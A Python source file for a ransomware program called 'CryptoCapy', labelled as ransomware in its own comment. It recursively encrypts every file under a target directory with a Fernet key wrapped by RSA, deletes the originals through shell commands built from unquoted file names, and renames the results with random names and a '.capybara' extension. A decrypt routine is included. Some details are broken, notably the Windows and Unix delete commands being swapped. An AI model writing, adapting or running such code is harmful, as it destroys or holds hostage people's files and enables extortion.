import os
import re
import pathlib
import random
import string
from subprocess import HIGH_PRIORITY_CLASS
import sys
import psutil
from time import sleep
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


class CryptoCapy:
    def __init__(self, directories):
        self.directories = directories
        self.crypter = None
        self.keys_folder = None

    def randomString(self):
        characters = string.ascii_letters + string.digits
        random_string = ''.join(random.choice(characters) for i in range(25))
        return random_string

    def generateKeysFolder(self):
        self.keys_folder = os.path.join(os.getcwd(), "keys")
        if os.path.exists(self.keys_folder):
            for _, _, files in os.walk(self.keys_folder):
                for file in files:
                    os.remove(os.path.join(self.keys_folder, file))
            os.rmdir(self.keys_folder)
        os.mkdir(self.keys_folder)

    def getKeysFolderPath(self):
        self.keys_folder = os.path.join(os.getcwd(), "keys")

    def generateRSAKeys(self):
        key = RSA.generate(2048)

        private_key = key.exportKey()
        with open(os.path.join(self.keys_folder, 'private_key.pem'), 'wb') as f:
            f.write(private_key)

        public_key = key.publickey().exportKey()
        with open(os.path.join(self.keys_folder, 'public_key.pem'), 'wb') as f:
            f.write(public_key)

    def generateFernetKey(self):
        key = Fernet.generate_key()
        self.crypter = Fernet(key)

        with open(os.path.join(self.keys_folder, 'fernet_key.key'), 'wb') as f:
            f.write(key)

    def encryptFernetKey(self):
        with open(os.path.join(self.keys_folder, 'fernet_key.key'), 'rb') as f:
            fernet_key = f.read()

        public_key = RSA.import_key(open(os.path.join(self.keys_folder, 'public_key.pem')).read())
        public_crypter = PKCS1_OAEP.new(public_key)
        encrypted_fernet_key = public_crypter.encrypt(fernet_key)

        with open(os.path.join(self.keys_folder, 'fernet_key.key'), 'wb') as f:
            f.write(encrypted_fernet_key)

    def decryptFernetKey(self):
        with open(os.path.join(self.keys_folder, 'fernet_key.key'), 'rb') as f:
            encrypted_fernet_key = f.read()

        private_key = RSA.import_key(open(os.path.join(self.keys_folder, 'private_key.pem')).read())
        public_crypter = PKCS1_OAEP.new(private_key)
        decrypted_fernet_key = public_crypter.decrypt(encrypted_fernet_key)

        with open(os.path.join(self.keys_folder, 'fernet_key.key'), 'wb') as f:
            f.write(decrypted_fernet_key)

        key = open(os.path.join(self.keys_folder, 'fernet_key.key'), 'rb').read()
        self.crypter = Fernet(key)

    def encryptFiles(self):
        encrypted_count = 0
        for current_path, _, files_in_current_path in os.walk(self.directories):
            for file in files_in_current_path:
                original_file_name = pathlib.Path(file).stem
                original_file_ext = pathlib.Path(file).suffix
                full_file_data = "---file-name---" + original_file_name + "---file-ext---" + original_file_ext + "---"
                encrypted_full_file_data = self.crypter.encrypt(full_file_data.encode())
                original_file_abs_full_path = os.path.join(current_path, file)
                try:
                    with open(original_file_abs_full_path, 'rb') as f:
                        file_data = f.read()
                        encrypted_data = self.crypter.encrypt(file_data)
                    if os.name == "posix":
                        # os.remove(original_file_abs_full_path)
                        os.system(f'del /f /q "{original_file_abs_full_path}"')
                    elif os.name == "nt":
                        os.system(f"rm -f {original_file_abs_full_path}")

                    encrypted_file_name = self.randomString() + ".capybara"
                    encrypted_file_abs_full_path = os.path.join(current_path, encrypted_file_name)

                    with open(encrypted_file_abs_full_path, 'wb') as f:
                        f.write(encrypted_data)

                    with open(encrypted_file_abs_full_path, 'a') as f:
                        f.write("-=-=-=-=encryp-=-=-=-=" + encrypted_full_file_data.decode())

                    encrypted_count += 1
                    print(f"[+] Encrypted {encrypted_count} files...", end='\r')
                except Exception as e:
                    print(f"ERROR: {e}")
                    continue

        print(f"\n[+] Encrypted all files in {self.directories}")

    def decryptFiles(self):
        decrypted_count = 0
        pattern1 = "(?<=-=-=-=-=encryp-=-=-=-=)(.*)"
        pattern2 = "(?<=---file-name---)(.*?)(?=---file-ext---)"
        pattern3 = "(?<=---file-ext---)(.*?)(?=---)"

        for current_path, _, files_in_current_path in os.walk(self.directories):
            for file in files_in_current_path:
                if pathlib.Path(file).suffix == ".capybara":
                    try:
                        encrypted_file_abs_full_path = os.path.join(current_path, file)

                        with open(encrypted_file_abs_full_path, 'r') as f:
                            encrypted_data = f.read()

                            encrypted_full_file_data = re.findall(pattern1, str(encrypted_data))[0]
                            decrypted_full_file_data = self.crypter.decrypt(encrypted_full_file_data.encode()).decode()

                            original_file_name = re.findall(pattern2, str(decrypted_full_file_data))[0]
                            original_file_ext = re.findall(pattern3, str(decrypted_full_file_data))[0]

                            encrypted_data = encrypted_data.replace(str("-=-=-=-=encryp-=-=-=-=" + encrypted_full_file_data), "")

                        with open(encrypted_file_abs_full_path, 'wb') as f:
                            f.write(encrypted_data.encode())

                        with open(encrypted_file_abs_full_path, 'rb') as f:
                            encrypted_data = f.read()
                            decrypted_data = self.crypter.decrypt(encrypted_data)

                        with open(encrypted_file_abs_full_path, 'wb') as f:
                            f.write(decrypted_data)

                        original_file = original_file_name + original_file_ext
                        original_file_abs_full_path = os.path.join(current_path, original_file)
                        os.rename(encrypted_file_abs_full_path, original_file_abs_full_path)

                        decrypted_count += 1
                        print(f"\r[+] Decrypted {decrypted_count} files",  end="")
                        sys.stdout.flush()

                    except Exception as e:
                        print(f"ERROR: {e}")
                        pass

        print(f"\n[+] Decrypted all files in {self.directories}")


if __name__ == "__main__":
    PPID = os.getppid()
    PID = os.getpid()
    if os.name == "nt":
        psutil.Process(PID).nice(HIGH_PRIORITY_CLASS)
        psutil.Process(PPID).nice(HIGH_PRIORITY_CLASS)
    elif os.name == "posix":
        psutil.Process(PID).nice(19)
        psutil.Process(PPID).nice(19)

    # Ransomware
    cc = CryptoCapy(
        directories="path_goes_here"
    )

    # Encrypt or Decrypt
    print(f"[+] Starting CryptoCapy - PPID: {str(PPID)} + PID: {str(PID)}")
    action = "e"
    if action == "e":
        cc.generateKeysFolder()
        cc.generateRSAKeys()
        cc.generateFernetKey()
        sleep(0.5)
        cc.encryptFernetKey()
        sleep(0.5)
        cc.encryptFiles()
    elif action == "d":
        cc.getKeysFolderPath()
        cc.decryptFernetKey()
        sleep(0.5)
        cc.decryptFiles()
